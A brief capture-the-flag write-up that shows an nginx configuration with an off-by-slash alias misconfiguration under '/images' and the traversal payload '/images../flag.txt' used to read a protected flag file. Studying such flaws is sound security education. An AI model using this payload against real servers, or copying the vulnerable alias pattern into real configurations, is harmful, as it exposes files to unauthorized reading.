# gong_xi_fa_cai

When we first enter the website, we don't find much, and neither do we in the developer tools. However, we are given the configuration file for the website.

    server {
      listen 80 default_server;
      listen [::]:80 default_server;
      root /var/www/html;
      index index.html index.htm index.nginx-debian.html;
      server_name _;
      location / {
        # First attempt to serve request as file, then
        # as directory, then fall back to displaying a 404.
        try_files $uri $uri/ =404;
      }
      location = /flag.txt {
        deny all;
        return 403;
      }
      location /images {
        alias /var/www/html/images/;
      }
    }

What we see here is that there is a misconfiguration under

    location /images

With a missing <code>/</code> after <code>images</code>, the website is vulnerable to a directory traversal attack. This is an nginx off-by-slash misconfiguration, and when combined with an <code>alias</code> or <code>proxy_pass</code> directive, it allows us to traverse up the path by one step. 

With our payload:

    /images../flag.txt
    
We get our flag!

> WH2022{<3_dont_w4it_0r_say_a_single_vow_you_need_to_hear_me_out_and_they_speak_noooww_<3}
